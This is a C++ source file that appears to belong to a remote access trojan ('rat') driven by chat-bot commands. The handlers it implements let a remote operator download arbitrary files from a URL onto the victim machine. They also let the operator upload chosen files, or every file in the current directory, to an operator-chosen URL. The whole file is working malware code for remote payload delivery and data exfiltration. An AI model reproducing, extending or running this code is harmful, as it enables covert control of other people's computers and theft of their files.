#include "rat/Handler.hpp"
#include "rat/system.hpp"
#include <sstream>
#include <filesystem>
#include "logging.hpp"

namespace rat::handler {



void Handler::handleDownloadCommand() {
    if (this->command.parameters.empty()) {
        bot.sendMessage("Usage: /download <url> [path]");
        return;
    }

    const auto& params = this->command.parameters;
    const size_t number_params = params.size();
    const std::string& url = params[0];

    switch (number_params) {
        case 1: {
            // simple one url
            this->curl_client.download(url);
            break;
        }
        case 2: {
            const std::filesystem::path path(params[1]);

            if (std::filesystem::exists(path) && std::filesystem::is_directory(path)) {
                const auto file_path = path / rat::networking::_getFilePathFromUrl(url);
                this->curl_client.download(url, file_path);
            } else {
                if (std::filesystem::exists(path)) {
                    bot.sendMessage(fmt::format("Warning overwriting the file {}", path.string()));
                }
                try {
                    if(this->curl_client.download(url, path) ) {
                        bot.sendMessage(fmt::format("The file was downloaded {}", path.string())); 
                    }
                } catch (const std::exception& e) {
                    const std::string error(e.what());  // safe copy
                    ERROR_LOG(error);
                    bot.sendMessage(error);
                }
            }
            break;
        }
    }
}

void Handler::handleUploadCommand() {
    if (this->command.parameters.size() < 2) {
        bot.sendMessage("Usage: /upload < <filepaths>/ * > <url>");
        return;
    }

    // Move the last element out as the URL
    std::string url = std::move(this->command.parameters.back());
    this->command.parameters.pop_back(); // remove it from parameters

    // Now move the remaining parameters into paths
    std::vector<std::string> paths = std::move(this->command.parameters);

    // Handle "*" meaning all files in current directory
    if (paths.size() == 1 && paths[0] == "*") {
        std::vector<std::filesystem::path> real_paths;

        for (const auto& entry : std::filesystem::directory_iterator(std::filesystem::current_path())) {
            if (std::filesystem::is_regular_file(entry.status())) {
                real_paths.push_back(entry.path());
            }
        }

        if (real_paths.empty()) {
            bot.sendMessage("No files found in current directory.");
            return;
        }

        for (const auto& file_path : real_paths) {
            try {
                this->curl_client.upload(file_path, url);
            } catch (const std::exception& e) {
                bot.sendMessage(fmt::format("Failed to upload {}: {}", file_path.string(), e.what()));
            }
        }
    } else {
        // Explicit list of files
        for (auto& p : paths) {
            std::filesystem::path file_path(std::move(p));

            if (!std::filesystem::exists(file_path)) {
                bot.sendMessage(fmt::format("File does not exist: {}", file_path.string()));
                continue;
            }

            if (std::filesystem::is_directory(file_path)) {
                bot.sendMessage(fmt::format("Skipping directory: {}", file_path.string()));
                continue;
            }

            try {
                this->curl_client.upload(file_path, url);
            } catch (const std::exception& e) {
                bot.sendMessage(fmt::format("Failed to upload {}: {}", file_path.string(), e.what()));
            }
        }
    }

    bot.sendMessage("Upload complete.");
}
}//rat::handler